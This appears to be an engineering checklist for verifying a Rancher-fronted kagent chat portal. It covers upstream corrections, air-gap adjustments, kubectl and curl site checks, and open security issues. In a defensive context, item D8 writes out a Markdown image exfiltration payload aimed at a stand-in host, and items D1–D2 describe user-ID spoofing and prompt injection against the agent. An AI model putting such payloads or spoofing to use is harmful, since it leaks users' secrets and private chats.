# Kagent Chat Portal: Verification Checklist

As of 2026-11-19. Companion to [design.md](design.md).

Use this list to check the design against the real (air-gapped) environment before Phase 1. Section 1 lists statements in the design that upstream source shows are wrong. Section 2 lists what the air gap changes. Sections 3–5 are checks to run on site and design issues to settle.

The upstream findings came from reading Rancher (v2.13.0, v2.14.0, release/v2.13), Kubernetes (master), kagent (v0.9.6, v1.0.1) and trpc-a2a-go (v0.2.5) source, plus the design's cited pages. **Nothing was tested against a live cluster.** Your installs may run different patch versions or custom Helm values, so confirm every item on site.

Mark each item ☐ → ☑ with the result and the date.

---

## 1. Corrections to the design (upstream facts)

| # | Design section | Design says | Upstream shows | Action |
| --- | --- | --- | --- | --- |
| C1 | Version compatibility | kagent 1.x moves A2A to gRPC with header-based routing | 1.x serves **both** gRPC and HTTP JSON-RPC/SSE on port 8083. HTTP: `POST /agents/{ns}/{name}`, card at `/agents/{ns}/{name}/.well-known/agent-card.json`. gRPC routes by a `tenant` field (`ns/name`), not a header. `/api/a2a/...` is removed. A2A v1.0: `A2A-Version: 1.0` header required, methods `SendMessage` / `SendStreamingMessage` / `GetTask`, role `ROLE_USER`, parts without `kind`. CRDs move to v1alpha3. | Rewrite the 1.x row. The upgrade is a path + method + body rewrite of the `a2a` module; HTTP through the service proxy still works. |
| C2 | Phase 0, R2 | Look for a fix after v0.9.6 and plan an upgrade | #1882 was fixed by PR #1913 (merged 2026-05-26), which is **already in v0.9.5 and v0.9.6** (commit 067c2fa). The bug hit every call, not only multi-turn. | Change R2 to "confirm the fix works on our build". |
| C3 | Version compatibility | v2.14 `/v1-public/login` returns the new token shape | v2.14 code returns a **legacy v3 token**: `{"token":"<name>:<key>","expiresAt","id","type":"token"}`. Ext tokens from login are planned for v2.16+. Their bearer format will be `ext/<name>:<value>`. | Fix the row. `auth` reads the bearer only from the `token` field and treats it as opaque. |
| C4 | Token handling | v2.13 introduced `ext.cattle.io/v1` tokens | Shipped in **v2.12.0** behind the `ext-tokens` flag. v2.13 made them a public API. | Reword. |
| C5 | Sources | #55988 = session token migration and `/v1-public/login` | #55988 is "Add support for ext.Tokens to Rancher CLI", milestone v2.16.0. | Re-label the link. |
| C6 | Access control, R4 | List both `kagent-controller` and `http:kagent-controller:8083` | RBAC sees the raw path segment `http:kagent-controller:8083` (`requestinfo.go`). The plain name matches only `services/kagent-controller/proxy`. Rancher's own `monitoring-ui-view` uses the same full-string pattern. | Keep the full string. Remove the plain name, or keep it with a note that it's unused. |
| C7 | Phase 0, R4 fallback | Drop `resourceNames` and rely on the namespace scope | The role is cluster-scoped, so dropping `resourceNames` grants proxy to **every Service in every namespace**. | Remove this fallback. |
| C8 | Access control, Granting access | Broad roles such as cluster owner already include the permission | cluster-owner: yes (`*/*/*`). **cluster-member: no.** project-member/owner: only if the `kagent` namespace is in their project. | Reword. Most users will need the new role. |
| C9 | Chat flow | Agent card at `.well-known/agent.json` | v0.9.6 serves both `agent.json` (deprecated) and `agent-card.json`. 1.x serves only `agent-card.json`. | Switch to `agent-card.json`. Keep the trailing `/` on the A2A path. |
| C10 | Version compatibility | "Avoid v3 API calls elsewhere" | Logout needs `POST /v3/tokens?action=logout` (or `DELETE /v3/tokens/<id>`). | State the exception explicitly. |
| C11 | Phase 0, R3 fallback | `/v3-public/...?action=login` "still in use" | In v2.14 it is marked deprecated and sits behind the `v3-public` feature flag (default on). | Check the flag on each site (E5). |
| C12 | Phase 0, R1 | Streaming timeouts unknown | kagent controller → agent client has a **hard total timeout**: Helm `controller.streaming.timeout`, default **600s**. It is applied as `http.Client.Timeout`, so it caps stream *and* blocking send. No SSE heartbeats. Events are batched for up to 50 ms. | Add to R1. The `message/send` fallback does not escape the cap; only non-blocking send + `tasks/get` might. Whether non-blocking works at all is unverified. |
| C13 | Chat flow, Request | Identity via `X-User-Id` | In the default `unsecure` auth mode, kagent takes `user_id` **query param first**, then `X-User-Id`, else `admin@kagent.dev`. A `trusted-proxy` mode exists but needs a Bearer JWT, which never reaches kagent (Rancher swaps the token, and the API server strips `Authorization`). Issue #2441: a `user_id` containing `+` causes 404s. AD DNs contain `,` `=` and spaces. | State the assumed auth mode. Encode or hash the ID (see D1). |

**Confirmed correct upstream (still confirm the environment matches):**
- the `scheme:name:port` service proxy URL
- the verb mapping: GET → `get`, POST → `create`
- the access check through Rancher evaluating as the real user (Rancher impersonates)
- `proxy` counts as a long-running subresource, so the API server's 60s timeout doesn't apply
- the kagent v0.9.6 service name `kagent-controller`, port 8083 and `/api/a2a/{ns}/{name}/` path
- the A2A 0.3 methods and body format
- both session TTL settings (the idle one is new in v2.13 and can't exceed the session TTL)
- `/v1-public/login` exists on v2.13 and v2.14, with body `{"type":"activeDirectoryProvider","username","password","responseType":"json","ttl":<ms>}`
- the v3 API being "internal and unsupported"
- the v2.13.11 authorization CVEs
- `rancher2_role_template`
- the AD principal is built from the DN

---

## 2. Air-gap: assumptions to adjust

| # | Area | Design assumes | Air-gap impact | Check / change |
| --- | --- | --- | --- | --- |
| A1 | LLM backend | Not discussed | ☑ Resolved: an internal model endpoint already serves kagent. Its speed still sets investigation length. | ☐ Typical and worst-case investigation time vs the 600s cap (C12). |
| A2 | Images | Minimal distroless base, Redis/Valkey | Built and pushed outside by CI (`.github/workflows/image.yml` → `ghcr.io/jhyoong/rank-proxy-webapp`); must then be carried into the internal registry. | ☐ Agree the transfer path (e.g. `skopeo copy` / `docker save` → media → internal registry). ☐ Mirror Redis/Valkey too. ☐ Deploy by digest. ☐ Confirm the registry path Fleet and the target cluster pull from. |
| A3 | Go build | `go build` with public modules | ☑ Resolved: development and CI run on internet-connected machines. | None. |
| A4 | Front end | htmx optional | Still applies at runtime: no CDN reachable from users' browsers. | ☐ Embed htmx (or plain JS) in the binary with `embed`. CSP stays `'self'`. |
| A5 | Image scanning in CI | Scanner pulls its vulnerability DB | ☑ Resolved: Trivy runs in GitHub Actions with internet access. | ☐ Decide whether to re-scan images periodically after transfer. |
| A6 | Role as code | Terraform `rancher2_role_template` | No registry.terraform.io. | ☐ Provider filesystem/network mirror available? Otherwise apply the RoleTemplate YAML to each site's `local` cluster via Fleet or kubectl. |
| A7 | Patch policy | "Keep sites on the latest patch" | Patches need images and charts mirrored first, so sites often lag. | ☐ Record the exact Rancher patch version per site and check it against the v2.13.11 CVEs (CVE-2026-104623, CVE-2026-94290). |
| A8 | kagent upgrades | "Plan an upgrade" | Same mirroring cost, and 1.x is a breaking change (C1). | ☐ Agree to stay on 0.9.x for this stage. Track 1.x separately. |
| A9 | TLS | CA bundle per site | Almost certainly an internal CA. | ☐ Collect the CA chain for each Rancher site's hostname. ☐ Confirm SANs. ☐ Note the cert rotation process. |
| A10 | NetworkPolicy egress | "Three Rancher sites, session store, DNS" | NetworkPolicy can't select hostnames. | ☐ Get the Rancher site IPs/CIDRs (and load balancer VIPs). ☐ Check whether the CNI supports FQDN policies. ☐ Confirm DNS resolves the site names from the portal cluster. |
| A11 | Reference links | Sources link to GitHub and docs | Not reachable from inside. | ☐ Save the needed pages or source files to an internal wiki or this repo. |
| A12 | Outbound calls by kagent | Not discussed | Telemetry or tracing exporters may try to reach the internet and fail or hang. | ☐ Check controller and agent logs for failing outbound connections. ☐ Disable or point any OTEL exporter internally. |
| A13 | Time | Not discussed | Token `expiresAt` and session TTLs depend on clocks. | ☐ Confirm NTP on the portal cluster and the Rancher sites. |

---

## 3. Environment checks (run on site)

Commands are examples. Run Rancher-side ones against each site's `local` cluster and cluster-side ones against one test cluster per site.

### Rancher (each of the 3 sites)

- ☐ **E1 Version.** `kubectl get settings.management.cattle.io server-version -o jsonpath='{.value}'`
- ☐ **E2 Session TTLs.** `kubectl get settings.management.cattle.io auth-user-session-ttl-minutes auth-user-session-idle-ttl-minutes`. The values must match across sites.
- ☐ **E3 What's in front of Rancher.** `kubectl -n cattle-system get ingress rancher -o yaml`: check `proxy-read-timeout`, `proxy-send-timeout` and `proxy-buffering`. The v2.13 chart sets 1800s read/send; v2.14.2 may have dropped these annotations (unverified). Without them, ingress-nginx defaults to **60s**. Also check any external load balancer or reverse proxy for idle timeouts and buffering.
- ☐ **E4 Login endpoint.** On a test account (mind lockout): `curl --cacert <ca> -X POST https://<site>/v1-public/login -d '{"type":"activeDirectoryProvider","username":"…","password":"…","responseType":"json","ttl":3600000}'`. Record the response shape and whether `ttl` is honoured.
- ☐ **E5 Feature flags.** `kubectl get features.management.cattle.io v3-public ext-tokens -o custom-columns=NAME:.metadata.name,VALUE:.spec.value,DEFAULT:.status.default`
- ☐ **E6 Logout.** `POST /v3/tokens?action=logout` with the token deletes it. Confirm the token is gone (`/v3/tokens/<id>` → 401/404).
- ☐ **E7 Cluster list for a non-admin.** `GET /v1/management.cattle.io.clusters` with a normal user's token returns only their clusters. Note the fields used: `spec.displayName`, and `status.conditions` `Connected` / `Ready` with reason `Disconnected`.
- ☐ **E8 Principal IDs match across sites.** For the same person on each site: `kubectl get users.management.cattle.io -o jsonpath='{range .items[*]}{.principalIds}{"\n"}{end}' | grep -i <name>`. The `activedirectory_user://` value must be byte-identical, including DN case and spacing. Also check whether any site still has GUID-based IDs.
- ☐ **E9 Default roles.** `kubectl get roletemplate cluster-member -o yaml`: confirm there is no `services/proxy`. List who has cluster-owner today; they already have kagent access.
- ☐ **E10 Rate limits.** Check whether Rancher (or the load balancer) rate-limits API calls per user or per IP; the portal comes from one IP.
- ☐ **E11 AD lockout policy.** Find the threshold and observation window, and which other systems also count failed attempts.

### Downstream clusters (one per site, then sample)

- ☐ **E12 kagent Helm values.** Get the values from the Fleet bundle or `helm -n kagent get values kagent`. Record `controller.auth.mode` (expect `unsecure`), `controller.streaming.timeout` (default 600s) and the release name (sets the service name `<release>-controller`).
- ☐ **E13 Service and port.** `kubectl -n kagent get svc kagent-controller -o jsonpath='{.spec.ports}'` includes `8083`.
- ☐ **E14 API server can reach pod IPs.** As an admin, run `kubectl get --raw '/api/v1/namespaces/kagent/services/http:kagent-controller:8083/proxy/api/a2a/<ns>/<agent>/.well-known/agent-card.json'`. A 503 "no endpoints" or a dial timeout means the control plane can't route to pods, so this design doesn't work on that cluster. Test every distro and network type you have.
- ☐ **E15 Agent ServiceAccount rights.** `kubectl auth can-i --list --as=system:serviceaccount:<ns>:<agent-sa>`. Note especially `secrets`, `configmaps` in system namespaces, and `pods/exec` / `pods/log`.
- ☐ **E16 Only one `http:kagent-controller:8083`.** `kubectl get svc -A | grep kagent-controller`
- ☐ **E17 `local` clusters.** Is kagent on any site's `local` cluster?
- ☐ **E18 Through Rancher as a normal user.** Repeat E14 via `https://<site>/k8s/clusters/<id>/...` with a test user who has only the `kagent-user` role. Then remove the role and expect a 403.

---

## 4. Phase 0 items, revised

| ID | Revised test |
| --- | --- |
| R1 | Run `message/stream` via Rancher on each site. Measure time to first event and inter-event gaps. Run a deliberate long task to find **which** timeout fires first: ingress (E3), the kagent 600s cap (E12), or an LB idle timeout during silent tool calls. Then test `message/send` with `configuration.blocking=false` + `tasks/get` polling, which is the only fallback that might outlast the cap. Confirm it works on v0.9.6. |
| R2 | Send 3 messages with one `contextId` on v0.9.6. Expect success (fix already shipped). Repeat with a DN-derived user ID containing `,` `=` space and `+` (#2441). |
| R3 | E4–E6, plus confirm the `ttl` field. |
| R4 | Expected answer: the full string `http:kagent-controller:8083`. Confirm with a SelfSubjectAccessReview (`resource=services, subresource=proxy, name=http:kagent-controller:8083, verb=create`) and E18. |
| R5 | Confirm `X-User-Id` and `Content-Type` arrive at kagent (controller debug logs). Note that `Authorization` will **not** arrive. Check that `?user_id=` also overrides the header (C13). |
| R6 (new) | Audit the agent's ServiceAccount (E15) and decide whether it is acceptable to give every `kagent-user` holder those read rights. |
| R7 (new) | Air-gap build path: vendored Go build, internal images, offline scanner DB (A2–A5). |

---

## 5. Design issues to settle

### High

- ☐ **D1 Other users' chats can be read.** `X-User-Id` / `user_id` are caller-set, and a DN is guessable. Any role holder can call the proxy directly and read a colleague's history, which may contain pasted secrets. This contradicts "not a risk at this stage". *Fix:* send `HMAC(portal_key, principal)` (which also solves encoding, C13). Say plainly that history is not private.
- ☐ **D2 "Read-only" ≠ safe.** The role effectively grants the agent SA's read rights (E15) on every cluster, and cluster data (logs, annotations) can carry prompt injection. *Fix:* R6. Narrow the SA (no `secrets`). Make role approval reflect this.
- ☐ **D3 Portal compromise = admin tokens for every logged-in user on all three sites.** The encryption key sits in the same pod, so encryption only protects Redis dumps and backups. *Fix:* treat the portal as Tier-0 (dedicated namespace or cluster, restricted Secret access, Redis with TLS + AUTH + ingress NetworkPolicy). Request short tokens via the `ttl` field. Rotate the session ID at login. Plan key rotation.
- ☐ **D4 Site 1 is a single point of failure for login.** A network error at site 1 currently means nobody can log in. *Fix:* stop only on an explicit credential rejection (401). On a network error or 5xx, fall back to the next site. Confirm all users can authenticate on site 1.
- ☐ **D5 Long investigations.** See C12/R1. Set user expectations and decide the cap.

### Medium

- ☐ **D6 One site's 401 shouldn't end the whole session.** Mark only that site unavailable. Check whether chatting through site 2 keeps sites 1 and 3 from idling out (unverified).
- ☐ **D7 The login rate limit can be used for denial of service.** A per-username limit lets anyone lock an admin out of the portal. Rely mainly on per-IP limits plus backoff, using the E11 numbers.
- ☐ **D8 Exfiltration through rendered output.** Sanitised Markdown still loads images (`![](http://x/?d=secret)`). Set CSP `img-src 'self'`, `connect-src 'self'`, `form-action 'self'`, and disable image and auto-link rendering. With htmx, set `allowEval=false` and avoid `hx-on`. Air-gapped, the external exfil risk is lower but internal hosts still count.
- ☐ **D9 SSE and CSRF.** EventSource only sends GET. POST the message with a CSRF token, get a stream ID bound to the session, then GET the stream with no side effects.
- ☐ **D10 Load on Rancher.** The 10-at-a-time pre-check limit is per user. Add a global per-site semaphore and backoff on 429/5xx (E10).
- ☐ **D11 Error table.** Add 404 (agent or service missing), 429, and the API server's own 503 "no endpoints available". A 503 isn't always "cluster disconnected".
- ☐ **D12 Audit gap.** The agent's Kubernetes reads appear under its SA. Correlate them by logging `contextId` and task ID on both sides. Decide the content-logging open item before the pilot.
- ☐ **D13 Phase order.** Phase 1 needs the role, which isn't rolled out until Phase 2. Deploy it to the test clusters in Phase 0. Also note "kagent user" is the display name and `kagent-user` the ID.
- ☐ **D14 Identity stability.** The principal ID comes from the DN, so it changes on a rename or OU move. That loses history and changes audit identity (E8).

### Low

- ☐ **D15** Go strings can't be reliably erased. Read the password into a `[]byte` and zero it, or soften the wording.
- ☐ **D16** `SameSite=Lax` plus CSRF tokens is enough; `Strict` breaks links shared in chat tools.
- ☐ **D17** A single Redis undoes the 2 replicas. Decide whether Redis HA is needed.
- ☐ **D18** Not yet covered: concurrent sessions per user, failed token deletion at logout (retry + alert), and logout on browser close (cookie without `Max-Age`).
